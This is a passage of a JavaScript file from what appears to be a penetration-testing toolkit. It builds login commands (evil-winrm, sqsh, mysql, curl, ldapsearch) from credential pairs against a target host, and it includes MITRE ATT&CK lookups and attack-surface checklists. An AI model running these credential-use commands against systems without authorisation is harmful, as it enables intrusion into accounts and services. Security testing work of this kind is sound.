        formatted.push(`ftp ${u}:${p}@${targetHost}:${targetPort || 21}`);
        break;
      case "winrm":
        formatted.push(`evil-winrm -i ${targetHost} -u '${u}' -p '${p}'`);
        break;
      case "mssql":
        formatted.push(`sqsh -S ${targetHost}:${targetPort || 1433} -U '${u}' -P '${p}'`);
        break;
      case "mysql":
        formatted.push(`mysql -h ${targetHost} -P ${targetPort || 3306} -u '${u}' -p'${p}'`);
        break;
      case "http-basic":
        formatted.push(`curl -u '${u}:${p}' http://${targetHost}:${targetPort || 80}/`);
        break;
      case "http-form":
        formatted.push(`curl -X POST http://${targetHost}:${targetPort || 80}/login -d 'username=${encodeURIComponent(u)}&password=${encodeURIComponent(p)}'`);
        break;
      case "ldap":
        formatted.push(`ldapsearch -x -H ldap://${targetHost}:${targetPort || 389} -D '${u}' -w '${p}' -b 'dc=domain,dc=local'`);
        break;
      default:
        formatted.push(`${protocol}: ${u}:${p}@${targetHost}:${targetPort || "default"}`);
    }
  }
  return formatted;
}

// ═══════════════════════════════════════════════════════════════════════════════
// UTILITY FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════════

export function getTechniqueById(id) {
  for (const t of MITRE_TECHNIQUES) {
    if (t.id === id) return t;
    if (t.subtechniques) {
      const sub = t.subtechniques.find((s) => s.id === id);
      if (sub) return { ...sub, parent: t };
    }
  }
  return null;
}

export function getTechniquesByTactic(tacticId) {
  return MITRE_TECHNIQUES.filter((t) => t.tactic === tacticId);
}

export function searchTechniques(query) {
  const q = (query || "").toLowerCase();
  return MITRE_TECHNIQUES.filter((t) =>
    t.name.toLowerCase().includes(q) ||
    t.description.toLowerCase().includes(q) ||
    t.id.toLowerCase().includes(q) ||
    (t.subtechniques || []).some((s) => s.name.toLowerCase().includes(q) || s.id.toLowerCase().includes(q))
  );
}

export function getAttackSurface(targetType) {
  const surfaces = {
    "web-app": ["HTTP/HTTPS ports", "API endpoints", "Authentication mechanisms", "File upload", "WebSockets", "Third-party integrations", "CDN/WAF", "Subdomains"],
    "internal-network": ["All TCP/UDP ports", "SMB shares", "LDAP/AD", "DNS", "DHCP", "Printers", "IoT devices", "Wireless APs", "VPN endpoints"],
    "cloud": ["IAM policies", "Storage buckets", "Compute instances", "Serverless functions", "Databases", "API gateways", "Container registries", "Secrets management"],
    "active-directory": ["Domain controllers", "Certificate services (ADCS)", "DNS servers", "DHCP servers", "File servers", "Exchange/O365", "GPO configuration", "Trust relationships"],
  };
  return surfaces[targetType] || surfaces["web-app"];
}
